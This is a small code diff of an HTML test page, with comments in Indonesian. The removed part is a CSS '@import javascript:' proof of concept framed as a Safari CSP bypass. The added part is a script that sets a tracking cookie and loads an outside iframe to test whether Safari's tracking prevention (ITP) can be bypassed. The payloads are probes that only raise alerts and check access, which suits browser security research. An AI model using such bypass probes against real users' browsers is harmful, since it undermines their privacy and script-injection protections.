@@ -1,13 +1,15 @@
-<style>
-@supports (selector(:has(*))){
-  @import url('javascript:alert(document.domain)');
-}
-</style>
-<div id="host"></div>
+<button onclick="testStorage()">TEST ITP BYPASS 26.4</button>
 <script>
-let host = document.getElementById('host');
-let shadow = host.attachShadow({mode:'open'});
-shadow.innerHTML = `<style>@import url('javascript:alert("Safari CSS Import Bypass: "+document.domain)')</style>Host`;
-// Di Chrome: di-block
-// Di Safari 17 lama: alert muncul = CSP bypass
+async function testStorage(){
+  // 1. Set cookie via JS
+  document.cookie = "track=1; SameSite=None; Secure";
+  // 2. Cek hasStorageAccess
+  let has = await document.hasStorageAccess();
+  alert("hasStorageAccess: "+has);
+  // 3. Coba bypass via iframe + redirect chain
+  let f = document.createElement('iframe');
+  f.src = "https://0x403for.github.io/check.html";
+  document.body.appendChild(f);
+  // check.html coba baca cookie - kalau kebaca tanpa prompt = ITP BYPASS
+}
 </script>
